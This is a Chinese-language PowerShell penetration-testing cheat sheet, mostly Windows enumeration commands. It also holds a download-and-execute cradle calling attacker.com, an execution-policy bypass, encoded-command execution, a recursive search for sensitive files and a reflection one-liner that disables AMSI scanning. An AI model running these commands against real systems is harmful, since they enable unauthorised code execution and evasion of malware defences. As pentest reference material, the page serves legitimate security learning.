# Windows渗透

_1 条工具命令_

### PowerShell渗透命令  `powershell-pentest`
_PowerShell渗透测试常用命令_

**Step 0**
> 绕过执行策略运行脚本
_platform: windows_
```
powershell -ExecutionPolicy Bypass -File script.ps1
```
**语法解析：**
- `-ExecutionPolicy Bypass` — 绕过执行策略 _parameter_

**Step 0**
> 从远程下载并执行脚本
_platform: windows_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")  # security-allowlist: SEC005
```
**语法解析：**
- `IEX` — Invoke-Expression，执行字符串 _command_ <!-- security-allowlist: SEC004 -->
- `Net.WebClient` — Web客户端类 _value_
- `DownloadString` — 下载字符串内容 _value_

**Step 0**
> 使用Base64编码执行命令
_platform: windows_
```
powershell -EncodedCommand BASE64_ENCODED_COMMAND
```
**语法解析：**
- `-EncodedCommand` — Base64编码的命令 _parameter_

**Step 0**
> 获取系统信息
_platform: windows_
```
Get-ComputerInfo
systeminfo
Get-WmiObject -Class Win32_OperatingSystem
```

**Step 0**
> 获取运行进程
_platform: windows_
```
Get-Process | Select-Object Name,Id,Path
Get-WmiObject Win32_Process | Select-Object Name,ProcessId,CommandLine
```

**Step 0**
> 获取服务信息
_platform: windows_
```
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject Win32_Service | Select-Object Name,State,StartName
```

**Step 0**
> 获取网络连接
_platform: windows_
```
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,OwningProcess
netstat -ano
```

**Step 0**
> 获取用户信息
_platform: windows_
```
Get-LocalUser
net user
net localgroup administrators
```

**Step 0**
> 简单端口扫描
_platform: windows_
```
1..1024 | % {Test-NetConnection -Port $_ -ComputerName target_ip}
```

**Step 0**
> 搜索敏感文件
_platform: windows_
```
Get-ChildItem -Path C:\ -Include *.txt,*.doc,*.xls -Recurse -ErrorAction SilentlyContinue
```

**Step 0**
> 绕过AMSI检测
_platform: windows_
```
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

---
